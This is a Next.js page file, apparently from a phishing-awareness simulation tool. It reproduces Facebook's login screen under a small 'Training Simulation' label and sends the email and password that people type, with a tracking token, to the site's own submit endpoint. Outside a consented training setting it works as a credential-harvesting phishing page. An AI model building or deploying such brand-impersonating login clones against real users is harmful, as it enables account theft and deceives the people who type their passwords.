//app/account-review/facebook/page.tsx
"use client";

import Image from "next/image";
import { useSearchParams, useRouter } from "next/navigation";
import { useEffect, useState } from "react";

export default function Home() {
  const sp = useSearchParams();
  const router = useRouter();
  const token = sp.get("session") ?? "";

  const [emailOrPhone, setEmailOrPhone] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (!token) return;

    fetch("/api/click", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ token }),
    });
  }, [token]);

  const handleSubmit = async () => {
    if (!token) return;

    try {
      setLoading(true);

      await fetch("/api/submit", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          token,
          submitted_email: emailOrPhone,
          submitted_password: password,
        }),
      });

      router.push("/result");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="bg-gray-100 h-screen flex items-center justify-center">

      <div className="fixed top-3 right-4 text-xs text-gray-500">
        Training Simulation
      </div>

      {/* Left */}
      <div className="text-3xl w-1/2 px-10">
        <Image
          src={"/images/facebook.png"}
          width={300}
          height={100}
          alt="Logo"
        />
        <p className="ml-1 mt-1">
          Facebook helps you connect and share with the people in your life.
        </p>
      </div>

      {/* Right */}
      <div className="bg-white flex flex-col p-5 rounded-xl w-1/3">
        <input
          className="my-2 border border-gray-100 p-3 rounded-md focus:outline-1 outline-blue-600"
          type="text"
          placeholder="Email address or phone number"
          value={emailOrPhone}
          onChange={(e) => setEmailOrPhone(e.target.value)}
        />

        <input
          className="my-2 border border-gray-100 p-3 rounded-md focus:outline-1 outline-blue-600"
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />

        <button
          onClick={handleSubmit}
          disabled={loading || !token}
          className="bg-blue-600 my-2 py-2 text-lg font-bold text-white rounded-md hover:bg-blue-700"
        >
          {loading ? "Logging in..." : "Log in"}
        </button>

        <p className="cursor-pointer text-blue-600 text-sm my-2 text-center hover:underline">
          Forgotten password?
        </p>

        <span className="my-2">
          <hr />
        </span>

        <button className="bg-green-500 my-2 py-2 px-2 text-lg font-bold text-white rounded-md hover:bg-green-600 w-fit mx-auto">
          Create new account
        </button>
      </div>
    </div>
  );
}